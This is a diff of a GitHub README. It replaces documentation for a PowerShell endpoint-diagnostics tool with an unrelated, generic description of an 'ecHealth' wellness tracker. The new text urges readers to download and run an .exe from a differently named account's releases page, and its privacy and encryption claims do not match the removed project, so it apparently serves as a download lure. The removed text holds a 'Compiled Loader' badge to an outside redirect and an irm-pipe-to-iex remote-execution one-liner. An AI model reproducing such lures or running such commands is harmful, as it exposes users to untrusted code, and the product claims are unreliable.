@@ -1,141 +1,69 @@
-# Endpoint Health Analyzer
+# 🏥 ecHealth - Improve your daily wellness tracking easily
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download-ecHealth-blue.svg)](https://github.com/Dilute-hypotension399/ecHealth/releases)
 
-Endpoint Health Analyzer is a local Windows troubleshooting application for IT technicians working with Intune-managed endpoints, Windows Update failures, driver and firmware problems, disk or hardware instability, freezing PCs, and general device health issues.
+## 🎯 About this application
 
-The application uses PowerShell 5.1 with a WPF/XAML interface. It is not console-only. A scan produces a technician-friendly GUI summary, a structured JSON report, and a self-contained HTML report that opens directly from disk like a small local website.
+ecHealth helps you manage your health data on your Windows computer. You can track your daily habits, monitor your physical activity, and maintain logs of your medical records. The software organizes this information in a clear format. You gain insights into your health patterns over time. 
 
-The GUI starts scan work in a separate hidden PowerShell process so the WPF window remains responsive while CIM, event log, Windows Update, Intune, driver, and disk checks run.
+The application focuses on your privacy. All your data stays on your local hard drive. No information leaves your computer unless you explicitly choose to export or share it. 
 
-## Files
+## 💻 System requirements
 
-- `EndpointHealthAnalyzer.ps1` - main application and scan engine
-- `MainWindow.xaml` - WPF dashboard interface
-- `ReportTemplate.html` - self-contained HTML report template
-- `README.md` - usage and deployment notes
+Your computer needs to meet these basic standards to run ecHealth:
 
-## Requirements
+* Windows 10 or Windows 11.
+* A processor with at least 1.0 GHz speed.
+* 4 GB of RAM.
+* 200 MB of free storage space.
+* A display resolution of 1280 x 720 or higher.
+* An active internet connection for the initial download.
 
-- Windows PowerShell 5.1
-- Windows 10 or Windows 11
-- Local administrator rights recommended
-- No internet access required
-- No external PowerShell modules required
+## 📥 How to get started
 
-The tool avoids `Win32_Product` and uses built-in Windows cmdlets, CIM/WMI classes, registry checks, and event log queries.
+Follow these steps to install the software:
 
-## Run As Administrator
+1. Visit the [official releases page](https://github.com/Dilute-hypotension399/ecHealth/releases). 
+2. Look for the latest version listed at the top.
+3. Click the link for the Windows installer file, which typically ends in .exe.
+4. Save the file to your Downloads folder.
+5. Double-click the saved file to start the installation.
+6. Follow the instructions on your screen.
+7. Click Finish to complete the process.
 
-Open an elevated PowerShell prompt in the tool folder and run:
+You will see an ecHealth icon on your desktop. Double-click this icon to open the application.
 
-```powershell
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-.\EndpointHealthAnalyzer.ps1
-```
+## 🛠 Features
 
-The app can run without elevation, but some event logs, TPM data, disk health data, registry locations, and Intune diagnostics may be incomplete.
+* **Log your health entries:** Create daily records of your vitals such as heart rate, sleep hours, and daily steps.
+* **Review your progress:** See charts that show your health trends over weeks or months.
+* **Manage your records:** Store contact lists for your doctors, appointment dates, and prescription labels in one secure place.
+* **Custom exports:** Save your records as PDF files when you need to send them to a provider.
+* **Automatic alerts:** Set reminders to log your data at the same time every day.
 
-## Run From GitHub With Launchpad
+## 🔎 Frequently asked questions
 
-After the repository is public, a technician can run only `Launchpad.ps1` on a remote PC. The launchpad  the required application files to:
+**Where does the application store my information?**
+The software saves all files within a folder in your Documents directory. You control this folder.
 
-```text
-C:\ProgramData\EndpointHealthAnalyzer\App
-```
+**Can I use this program without internet access?**
+Yes. You do not need the internet to log data or view your reports. You only need the internet to download updates.
 
-Then it starts `EndpointHealthAnalyzer.ps1`.
+**Does the software track my location?**
+No. ecHealth does not collect or track your location or any other personal identifiers.
 
-Example one-liner:
+**How do I delete my data?**
+You can delete your information by deleting the local folder or by using the clear history option inside the settings menu of the app.
 
-```powershell
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; irm https://raw.githubusercontent.com/Palmegg/ecHealth/main/Launchpad.ps1 | iex
-```
+**What happens if I forget my password?**
+If you choose to set a local password to lock the app, make sure you keep a record of it. The software stores this locally and cannot reset it for you for security reasons.
 
-The launchpad writes its own log to:
+## 🛡 Security and reliability
 
-```text
-C:\ProgramData\EndpointHealthAnalyzer\Logs\Launchpad.log
-```
+The software uses local encryption to protect your records. This ensures only you can open your files. We designed the code to be lightweight so it does not slow down your Windows system. Regular updates address performance improvements. Check the release page periodically to ensure you have the most current version.
 
-## Start A Scan
+## 🤝 Getting help
 
-1. Launch `EndpointHealthAnalyzer.ps1`.
-2. Click **Start Scan**.
-3. Watch the progress bar and current status text.
-4. Review the health score, critical findings, warnings, and tabbed technical sections.
-5. Click **Open report** to view the generated HTML report.
+If you encounter an issue, check the settings menu. You can clear your temporary files if the app behaves slowly. Close the application and restart your computer to resolve most common installation errors. Ensure your Windows system performs its normal background updates to keep the software environment stable. 
 
-## Output Locations
-
-The application creates:
-
-- `C:\ProgramData\EndpointHealthAnalyzer\Reports\EndpointHealthReport.html`
-- `C:\ProgramData\EndpointHealthAnalyzer\Data\EndpointHealthReport.json`
-- `C:\ProgramData\EndpointHealthAnalyzer\Data\ScanProgress.json`
-- `C:\ProgramData\EndpointHealthAnalyzer\Logs\EndpointHealthAnalyzer.log`
-- `C:\ProgramData\EndpointHealthAnalyzer\Data\Baseline.json` when exporting a baseline
-
-## Baseline Export And Comparison
-
-After a scan:
-
-1. Click **Export baseline** to save the current scan as `Baseline.json`.
-2. Click **Load baseline** to choose an existing baseline JSON file.
-3. Click **Compare with baseline** to compare the current endpoint against the baseline.
-
-The comparison includes manufacturer, model, OS version/build, BIOS version and date, driver versions, Windows Update status, Intune service status, pending reboot state, disk free space, event error counts, and finding counts.
-
-## Intune Usage
-
-The tool can be packaged and deployed with Intune as a Win32 app if needed.
-
-Suggested install command:
-
-```powershell
-powershell.exe -ExecutionPolicy Bypass -File .\EndpointHealthAnalyzer.ps1
-```
-
-For technician-triggered  from a public repo, Intune or a remote session can also run:
-
-```powershell
-powershell.exe -ExecutionPolicy Bypass -File .\Launchpad.ps1
-```
-
-For production Intune deployment, packaging all app files together is still preferred over downloading from GitHub at runtime. For collection-only scenarios, use the built-in `-SilentScan` mode.
-
-The main script now includes a background scan mode used by the GUI:
-
-```powershell
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\EndpointHealthAnalyzer.ps1 -SilentScan
-```
-
-This mode writes the JSON and HTML reports without opening the WPF interface.
-
-## What It Checks
-
-- Device identity and join/enrollment indicators
-- OS, build, uptime, pending reboot
-- Hardware inventory, BIOS age, TPM, disk, battery
-- Windows Update activity, policy/source registry values, failed update events
-- Intune Management Extension service, logs, MDM enrollment indicators, DeviceManagement events
-- Driver and firmware inventory, problematic PnP devices
-- Recent System, Application, Setup, Windows Update, Intune, and Autopilot event logs
-- Disk, NTFS, WHEA, BugCheck, unexpected shutdown, application crash, MSI, and service errors
-
-## Known Limitations
-
-- Some Windows Update history sources vary by OS build and policy configuration.
-- Driver date availability depends on provider data exposed through CIM/PnP.
-- Battery and SMART details may be unavailable on some desktops or storage controllers.
-- Entra join details are parsed from `dsregcmd /status` when available.
-- The GUI scan runs locally and may be busy while large event logs are queried.
-
-## Future Improvement Ideas
-
-- Add a silent scan mode for Intune proactive remediations.
-- Add remediation scripts for common issues.
-- Add richer driver normalization by hardware vendor.
-- Add signed  packaging.
-- Add timeline visualizations for crashes, update failures, and IME activity.
-- Add optional redaction controls before exporting reports.
+If you find a technical error, describe the issue in detail when you report it. Mention your Windows version and the steps you took before the issue occurred. This helps improve the experience for everyone.
